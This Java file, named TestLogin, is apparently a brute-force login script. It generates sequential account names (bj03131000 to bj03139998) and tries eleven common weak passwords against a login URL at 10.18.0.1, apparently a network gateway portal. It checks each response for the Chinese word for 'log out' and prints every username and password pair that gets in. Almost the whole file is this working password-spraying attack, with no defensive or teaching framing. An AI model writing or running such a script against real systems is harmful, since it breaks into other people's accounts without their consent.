package Test;

import java.util.regex.Matcher;
import java.util.regex.Pattern;

import util.Util;

public class TestLogin {

  /**
   * @param argsbj03135323
   */
  public static final Pattern pattern = Pattern.compile("var\\ss=\"([^\"]+?)\";");

  public static void main(String[] args) throws InterruptedException {
    for (int i =1000; i < 9999; i++) {
      String username = "bj0313";
      String icount = String.valueOf(i);
      for (int j = 0; j < 4 - icount.length(); j++) {
        username = username + "0";
      }
      username = username + icount;
      String[] passwords = new String[] { "123456", "111111", "222222", "333333", "444444", "555555", "666666",
          "777777", "888888", "999999", "111222" };
      String link = "http://10.18.0.1/login?username=" + username + "&password=";
      for (String password : passwords) {
        String httplink = link + password;
        String text = Util.downLoadHTML(httplink);
        if (text.contains("登出")) {
          System.out.println(username + ":" + password + " is successful!");
          break;
        }
        Matcher m=pattern.matcher(text);
        if(m.find()){
          System.out.println(username+":"+password+" "+m.group(1));
        }else{
          System.out.println("[info] "+link);
        }
//        Thread.sleep(1000);
      }
    }
  }

}
